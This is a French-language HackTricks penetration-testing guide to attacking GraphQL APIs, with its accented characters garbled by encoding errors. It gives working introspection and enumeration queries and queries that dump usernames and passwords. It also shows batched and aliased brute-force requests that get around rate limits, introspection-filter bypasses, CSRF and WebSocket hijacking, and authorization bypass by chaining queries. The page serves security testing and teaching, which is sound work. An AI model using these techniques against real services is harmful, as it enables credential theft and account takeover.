# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Introduction

GraphQL est **soulign√©** comme une **alternative efficace** √† l'API REST, offrant une approche simplifi√©e pour interroger des donn√©es depuis le backend. Contrairement √† REST, qui n√©cessite souvent de nombreuses requ√™tes √† travers divers points de terminaison pour rassembler des donn√©es, GraphQL permet de r√©cup√©rer toutes les informations n√©cessaires via une **unique requ√™te**. Cette rationalisation **b√©n√©ficie consid√©rablement aux d√©veloppeurs** en r√©duisant la complexit√© de leurs processus de r√©cup√©ration de donn√©es.

## GraphQL et s√©curit√©

Avec l'av√®nement de nouvelles technologies, y compris GraphQL, de nouvelles vuln√©rabilit√©s de s√©curit√© √©mergent √©galement. Un point cl√© √† noter est que **GraphQL n'inclut pas de m√©canismes d'authentification par d√©faut**. Il incombe aux d√©veloppeurs de mettre en ≈ìuvre de telles mesures de s√©curit√©. Sans une authentification appropri√©e, les points de terminaison GraphQL peuvent exposer des informations sensibles √† des utilisateurs non authentifi√©s, posant un risque de s√©curit√© significatif.

### Attaques par force brute de r√©pertoire et GraphQL

Pour identifier les instances GraphQL expos√©es, il est recommand√© d'inclure des chemins sp√©cifiques dans les attaques par force brute de r√©pertoire. Ces chemins sont :

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identifier les instances GraphQL ouvertes permet d'examiner les requ√™tes prises en charge. Cela est crucial pour comprendre les donn√©es accessibles via le point de terminaison. Le syst√®me d'introspection de GraphQL facilite cela en d√©taillant les requ√™tes qu'un sch√©ma prend en charge. Pour plus d'informations √† ce sujet, consultez la documentation GraphQL sur l'introspection : [**GraphQL : un langage de requ√™te pour les API.**](https://graphql.org/learn/introspection/)

### Empreinte

L'outil [**graphw00f**](https://github.com/dolevf/graphw00f) est capable de d√©tecter quel moteur GraphQL est utilis√© sur un serveur et imprime ensuite des informations utiles pour l'auditeur de s√©curit√©.

#### Requ√™tes universelles <a href="#universal-queries" id="universal-queries"></a>

Pour v√©rifier si une URL est un service GraphQL, une **requ√™te universelle**, `query{__typename}`, peut √™tre envoy√©e. Si la r√©ponse inclut `{"data": {"__typename": "Query"}}`, cela confirme que l'URL h√©berge un point de terminaison GraphQL. Cette m√©thode repose sur le champ `__typename` de GraphQL, qui r√©v√®le le type de l'objet interrog√©.
```javascript
query{__typename}
```
### √ânum√©ration de base

Graphql prend g√©n√©ralement en charge **GET**, **POST** (x-www-form-urlencoded) et **POST**(json). Bien qu'il soit recommand√© pour des raisons de s√©curit√© de n'autoriser que json pour pr√©venir les attaques CSRF.

#### Introspection

Pour utiliser l'introspection afin de d√©couvrir des informations sur le sch√©ma, interrogez le champ `__schema`. Ce champ est disponible sur le type racine de toutes les requ√™tes.
```bash
query={__schema{types{name,fields{name}}}}
```
Avec cette requ√™te, vous trouverez le nom de tous les types utilis√©s :

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Avec cette requ√™te, vous pouvez extraire tous les types, leurs champs et leurs arguments (et le type des arguments). Cela sera tr√®s utile pour savoir comment interroger la base de donn√©es.

![](<../../.gitbook/assets/image (950).png>)

**Erreurs**

Il est int√©ressant de savoir si les **erreurs** vont √™tre **affich√©es** car elles contribueront avec des **informations** utiles.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**√ânum√©rer le sch√©ma de la base de donn√©es via l'introspection**

{% hint style="info" %}
Si l'introspection est activ√©e mais que la requ√™te ci-dessus ne s'ex√©cute pas, essayez de supprimer les directives `onOperation`, `onFragment` et `onField` de la structure de la requ√™te.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Requ√™te d'introspection en ligne :
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
La derni√®re ligne de code est une requ√™te graphql qui va extraire toutes les m√©ta-informations du graphql (noms des objets, param√®tres, types...)

![](<../../.gitbook/assets/image (363).png>)

Si l'introspection est activ√©e, vous pouvez utiliser [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) pour voir dans une interface graphique toutes les options.

### Interrogation

Maintenant que nous savons quel type d'informations est enregistr√© dans la base de donn√©es, essayons d'**extraire quelques valeurs**.

Dans l'introspection, vous pouvez trouver **quel objet vous pouvez interroger directement** (car vous ne pouvez pas interroger un objet juste parce qu'il existe). Dans l'image suivante, vous pouvez voir que le "_queryType_" s'appelle "_Query_" et qu'un des champs de l'objet "_Query_" est "_flags_", qui est √©galement un type d'objet. Par cons√©quent, vous pouvez interroger l'objet flag.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Notez que le type de la requ√™te "_flags_" est "_Flags_", et cet objet est d√©fini comme ci-dessous :

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Vous pouvez voir que les objets "_Flags_" sont compos√©s de **name** et **value**. Ensuite, vous pouvez obtenir tous les noms et valeurs des flags avec la requ√™te :
```javascript
query={flags{name, value}}
```
Notez que si l'**objet √† interroger** est un **type** **primitif** comme **string** comme dans l'exemple suivant

![](<../../.gitbook/assets/image (958).png>)

Vous pouvez simplement l'interroger avec :
```javascript
query={hiddenFlags}
```
Dans un autre exemple o√π il y avait 2 objets √† l'int√©rieur de l'objet de type "_Query_": "_user_" et "_users_".\
Si ces objets n'ont pas besoin d'argument pour rechercher, vous pourriez **r√©cup√©rer toutes les informations les concernant** juste en **demandant** les donn√©es que vous voulez. Dans cet exemple d'Internet, vous pourriez extraire les noms d'utilisateur et mots de passe sauvegard√©s :

![](<../../.gitbook/assets/image (880).png>)

Cependant, dans cet exemple, si vous essayez de le faire, vous obtenez cette **erreur** :

![](<../../.gitbook/assets/image (1042).png>)

On dirait que d'une mani√®re ou d'une autre, il va rechercher en utilisant l'argument "_**uid**_" de type _**Int**_.\
Quoi qu'il en soit, nous savions d√©j√† que, dans la section [Basic Enumeration](graphql.md#basic-enumeration), une requ√™te a √©t√© propos√©e qui nous montrait toutes les informations n√©cessaires : `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Si vous lisez l'image fournie lorsque j'ex√©cute cette requ√™te, vous verrez que "_**user**_" avait l'**arg** "_**uid**_" de type _Int_.

Donc, en effectuant un l√©ger _**uid**_ bruteforce, j'ai d√©couvert qu'avec _**uid**=**1**_ un nom d'utilisateur et un mot de passe ont √©t√© r√©cup√©r√©s :\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Notez que j'ai **d√©couvert** que je pouvais demander les **param√®tres** "_**user**_" et "_**password**_" parce que si j'essaie de chercher quelque chose qui n'existe pas (`query={user(uid:1){noExists}}`), j'obtiens cette erreur :

![](<../../.gitbook/assets/image (707).png>)

Et pendant la **phase d'√©num√©ration**, j'ai d√©couvert que l'objet "_**dbuser**_" avait comme champs "_**user**_" et "_**password**_.

**Truc de dump de cha√Æne de requ√™te (merci √† @BinaryShadow\_)**

Si vous pouvez rechercher par un type de cha√Æne, comme : `query={theusers(description: ""){username,password}}` et que vous **cherchez une cha√Æne vide**, cela va **dump toutes les donn√©es**. (_Notez que cet exemple n'est pas li√© √† l'exemple des tutoriels, pour cet exemple, supposez que vous pouvez rechercher en utilisant "**theusers**" par un champ de cha√Æne appel√© "**description**"_).

### Recherche

Dans cette configuration, une **base de donn√©es** contient des **personnes** et des **films**. Les **personnes** sont identifi√©es par leur **email** et leur **nom** ; les **films** par leur **nom** et leur **note**. Les **personnes** peuvent √™tre amies entre elles et avoir √©galement des films, indiquant des relations au sein de la base de donn√©es.

Vous pouvez **chercher** des personnes **par** le **nom** et obtenir leurs emails :
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Vous pouvez **rechercher** des personnes **par** le **nom** et obtenir leurs **films** **abonn√©s** :
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Notez comment il est indiqu√© de r√©cup√©rer le `name` des `subscribedMovies` de la personne.

Vous pouvez √©galement **rechercher plusieurs objets en m√™me temps**. Dans ce cas, une recherche de 2 films est effectu√©e :
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ou m√™me **relations de plusieurs objets diff√©rents en utilisant des alias** :
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

**Les mutations sont utilis√©es pour apporter des modifications c√¥t√© serveur.**

Dans l'**introspection**, vous pouvez trouver les **mutations** **d√©clar√©es**. Dans l'image suivante, le "_MutationType_" est appel√© "_Mutation_" et l'objet "_Mutation_" contient les noms des mutations (comme "_addPerson_" dans ce cas) :

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Dans cette configuration, une **base de donn√©es** contient des **personnes** et des **films**. Les **personnes** sont identifi√©es par leur **email** et **nom** ; les **films** par leur **nom** et **note**. Les **personnes** peuvent √™tre amies entre elles et avoir √©galement des films, indiquant des relations au sein de la base de donn√©es.

Une mutation pour **cr√©er de nouveaux** films dans la base de donn√©es peut ressembler √† la suivante (dans cet exemple, la mutation est appel√©e `addMovie`) :
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Notez comment √† la fois les valeurs et le type de donn√©es sont indiqu√©s dans la requ√™te.**

De plus, la base de donn√©es prend en charge une op√©ration de **mutation**, nomm√©e `addPerson`, qui permet la cr√©ation de **persons** ainsi que leurs associations avec des **friends** et des **movies** existants. Il est crucial de noter que les friends et les movies doivent pr√©exister dans la base de donn√©es avant de les lier √† la personne nouvellement cr√©√©e.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Surcharge de directive

Comme expliqu√© dans [**l'une des vuln√©rabilit√©s d√©crites dans ce rapport**](https://www.landh.tech/blog/20240304-google-hack-50000/), une surcharge de directive implique d'appeler une directive m√™me des millions de fois pour faire perdre des op√©rations au serveur jusqu'√† ce qu'il soit possible de le DoS.

### Batching brute-force dans 1 requ√™te API

Cette information a √©t√© tir√©e de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Authentification via l'API GraphQL avec **l'envoi simultan√© de nombreuses requ√™tes avec diff√©rentes identifiants** pour le v√©rifier. C'est une attaque par force brute classique, mais il est maintenant possible d'envoyer plus d'une paire login/mot de passe par requ√™te HTTP gr√¢ce √† la fonctionnalit√© de batching de GraphQL. Cette approche tromperait les applications de surveillance de taux externes en leur faisant croire que tout va bien et qu'il n'y a pas de bot de force brute essayant de deviner des mots de passe.

Vous pouvez trouver ci-dessous la d√©monstration la plus simple d'une requ√™te d'authentification d'application, avec **3 paires email/mot de passe diff√©rentes √† la fois**. √âvidemment, il est possible d'en envoyer des milliers dans une seule requ√™te de la m√™me mani√®re :

![](<../../.gitbook/assets/image (1081).png>)

Comme nous pouvons le voir sur la capture d'√©cran de la r√©ponse, les premi√®re et troisi√®me requ√™tes ont renvoy√© _null_ et ont refl√©t√© les informations correspondantes dans la section _error_. La **deuxi√®me mutation avait les donn√©es d'authentification correctes** et la r√©ponse contient le bon jeton de session d'authentification.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sans Introspection

De plus en plus de **points de terminaison graphql d√©sactivent l'introspection**. Cependant, les erreurs que graphql renvoie lorsqu'une requ√™te inattendue est re√ßue sont suffisantes pour que des outils comme [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) puissent recr√©er la plupart du sch√©ma.

De plus, l'extension Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observe les requ√™tes API GraphQL passant par Burp** et **construit** un **sch√©ma** GraphQL interne avec chaque nouvelle requ√™te qu'il voit. Il peut √©galement exposer le sch√©ma pour GraphiQL et Voyager. L'extension renvoie une r√©ponse factice lorsqu'elle re√ßoit une requ√™te d'introspection. En cons√©quence, GraphQuail montre toutes les requ√™tes, arguments et champs disponibles pour une utilisation au sein de l'API. Pour plus d'infos [**v√©rifiez ceci**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Une belle **liste de mots** pour d√©couvrir [**les entit√©s GraphQL peut √™tre trouv√©e ici**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Contournement des d√©fenses d'introspection GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Pour contourner les restrictions sur les requ√™tes d'introspection dans les API, l'insertion d'un **caract√®re sp√©cial apr√®s le mot-cl√© `__schema`** s'av√®re efficace. Cette m√©thode exploite les erreurs courantes des d√©veloppeurs dans les motifs regex qui visent √† bloquer l'introspection en se concentrant sur le mot-cl√© `__schema`. En ajoutant des caract√®res comme **des espaces, des nouvelles lignes et des virgules**, que GraphQL ignore mais qui pourraient ne pas √™tre pris en compte dans le regex, les restrictions peuvent √™tre contourn√©es. Par exemple, une requ√™te d'introspection avec une nouvelle ligne apr√®s `__schema` peut contourner de telles d√©fenses :
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Si cela √©choue, envisagez des m√©thodes de requ√™te alternatives, telles que **GET requests** ou **POST avec `x-www-form-urlencoded`**, car des restrictions peuvent ne s'appliquer qu'aux requ√™tes POST.

### Essayez WebSockets

Comme mentionn√© dans [**cette conf√©rence**](https://www.youtube.com/watch?v=tIo\_t5uUK50), v√©rifiez s'il est possible de se connecter √† graphQL via WebSockets, car cela pourrait vous permettre de contourner un √©ventuel WAF et de faire en sorte que la communication websocket divulgue le sch√©ma de graphQL :
```javascript
ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
```
### **D√©couverte des structures GraphQL expos√©es**

Lorsque l'introspection est d√©sactiv√©e, examiner le code source du site Web √† la recherche de requ√™tes pr√©charg√©es dans les biblioth√®ques JavaScript est une strat√©gie utile. Ces requ√™tes peuvent √™tre trouv√©es en utilisant l'onglet `Sources` dans les outils de d√©veloppement, fournissant des informations sur le sch√©ma de l'API et r√©v√©lant potentiellement des **requ√™tes sensibles expos√©es**. Les commandes pour rechercher dans les outils de d√©veloppement sont :
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF dans GraphQL

Si vous ne savez pas ce qu'est le CSRF, lisez la page suivante :

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Vous allez pouvoir trouver plusieurs points de terminaison GraphQL **configur√©s sans jetons CSRF.**

Notez que les requ√™tes GraphQL sont g√©n√©ralement envoy√©es via des requ√™tes POST en utilisant le type de contenu **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Cependant, la plupart des points de terminaison GraphQL prennent √©galement en charge les requ√™tes POST **`form-urlencoded` :**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Donc, comme les requ√™tes CSRF comme celles pr√©c√©dentes sont envoy√©es **sans requ√™tes pr√©liminaires**, il est possible de **faire** **des changements** dans le GraphQL en abusant d'un CSRF.

Cependant, notez que la nouvelle valeur par d√©faut du cookie du drapeau `samesite` de Chrome est `Lax`. Cela signifie que le cookie ne sera envoy√© que depuis un site tiers dans des requ√™tes GET.

Notez qu'il est g√©n√©ralement possible d'envoyer la **requ√™te** **de requ√™te** √©galement en tant que **requ√™te GET et que le token CSRF pourrait ne pas √™tre valid√© dans une requ√™te GET.**

De plus, en abusant d'une [**attaque XS-Search**](../../pentesting-web/xs-search/), il pourrait √™tre possible d'exfiltrer du contenu depuis le point de terminaison GraphQL en abusant des identifiants de l'utilisateur.

Pour plus d'informations, **consultez le** [**post original ici**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## D√©tournement de WebSocket intersite dans GraphQL

Semblable aux vuln√©rabilit√©s CRSF abusant de GraphQL, il est √©galement possible de r√©aliser un **d√©tournement de WebSocket intersite pour abuser d'une authentification avec GraphQL avec des cookies non prot√©g√©s** et faire en sorte qu'un utilisateur effectue des actions inattendues dans GraphQL.

Pour plus d'informations, consultez :

{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
[websocket-attacks.md](../../pentesting-web/websocket-attacks.md)
{% endcontent-ref %}

## Autorisation dans GraphQL

De nombreuses fonctions GraphQL d√©finies sur le point de terminaison pourraient uniquement v√©rifier l'authentification du demandeur mais pas l'autorisation.

Modifier les variables d'entr√©e de la requ√™te pourrait conduire √† des d√©tails de compte sensibles [leak√©s](https://hackerone.com/reports/792927).

La mutation pourrait m√™me conduire √† une prise de contr√¥le de compte en essayant de modifier d'autres donn√©es de compte.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Contournement de l'autorisation dans GraphQL

[Chaining queries](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) ensemble peut contourner un syst√®me d'authentification faible.

Dans l'exemple ci-dessous, vous pouvez voir que l'op√©ration est "forgotPassword" et qu'elle ne devrait ex√©cuter que la requ√™te forgotPassword qui lui est associ√©e. Cela peut √™tre contourn√© en ajoutant une requ√™te √† la fin, dans ce cas nous ajoutons "register" et une variable utilisateur pour que le syst√®me s'enregistre en tant que nouvel utilisateur.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Contournement des limites de taux en utilisant des alias dans GraphQL

Dans GraphQL, les alias sont une fonctionnalit√© puissante qui permet le **nommage explicite des propri√©t√©s** lors d'une requ√™te API. Cette capacit√© est particuli√®rement utile pour r√©cup√©rer **plusieurs instances du m√™me type** d'objet dans une seule requ√™te. Les alias peuvent √™tre utilis√©s pour surmonter la limitation qui emp√™che les objets GraphQL d'avoir plusieurs propri√©t√©s avec le m√™me nom.

Pour une compr√©hension d√©taill√©e des alias GraphQL, la ressource suivante est recommand√©e : [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Bien que l'objectif principal des alias soit de r√©duire la n√©cessit√© de nombreux appels API, un cas d'utilisation non intentionnel a √©t√© identifi√© o√π les alias peuvent √™tre exploit√©s pour ex√©cuter des attaques par force brute sur un point de terminaison GraphQL. Cela est possible car certains points de terminaison sont prot√©g√©s par des limiteurs de taux con√ßus pour contrecarrer les attaques par force brute en restreignant le **nombre de requ√™tes HTTP**. Cependant, ces limiteurs de taux pourraient ne pas tenir compte du nombre d'op√©rations dans chaque requ√™te. √âtant donn√© que les alias permettent l'inclusion de plusieurs requ√™tes dans une seule requ√™te HTTP, ils peuvent contourner de telles mesures de limitation de taux.

Consid√©rez l'exemple fourni ci-dessous, qui illustre comment des requ√™tes alias√©es peuvent √™tre utilis√©es pour v√©rifier la validit√© des codes de r√©duction en magasin. Cette m√©thode pourrait contourner la limitation de taux puisqu'elle compile plusieurs requ√™tes en une seule requ√™te HTTP, permettant potentiellement la v√©rification de nombreux codes de r√©duction simultan√©ment.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Outils

### Scanners de vuln√©rabilit√©s

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Tester les erreurs de configuration courantes des points de terminaison graphql
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Script d'audit de s√©curit√© GraphQL ax√© sur l'ex√©cution de requ√™tes et de mutations GraphQL en lot.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Identifier le graphql utilis√©
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Bo√Æte √† outils pouvant √™tre utilis√©e pour r√©cup√©rer des sch√©mas et rechercher des donn√©es sensibles, tester l'autorisation, forcer les sch√©mas par brute force et trouver des chemins vers un type donn√©.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Peut √™tre utilis√© comme autonome ou [extension Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Peut √©galement √™tre utilis√© comme client CLI pour automatiser les attaques
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Outil qui r√©pertorie les diff√©rentes mani√®res de **atteindre un type donn√© dans un sch√©ma GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Le successeur des modes autonome et CLI d'InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Extension Burp pour des tests GraphQL avanc√©s. Le _**Scanner**_ est le c≈ìur d'InQL v5.0, o√π vous pouvez analyser un point de terminaison GraphQL ou un fichier de sch√©ma d'introspection local. Il g√©n√®re automatiquement toutes les requ√™tes et mutations possibles, les organisant dans une vue structur√©e pour votre analyse. Le composant _**Attacker**_ vous permet d'ex√©cuter des attaques GraphQL en lot, ce qui peut √™tre utile pour contourner des limites de taux mal impl√©ment√©es.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Essayer d'obtenir le sch√©ma m√™me avec l'introspection d√©sactiv√©e en utilisant l'aide de certaines bases de donn√©es Graphql qui sugg√©reront les noms des mutations et des param√®tres.

### Clients

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Client GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Client GUI

### Tests automatiques

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Vid√©o expliquant AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## R√©f√©rences

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
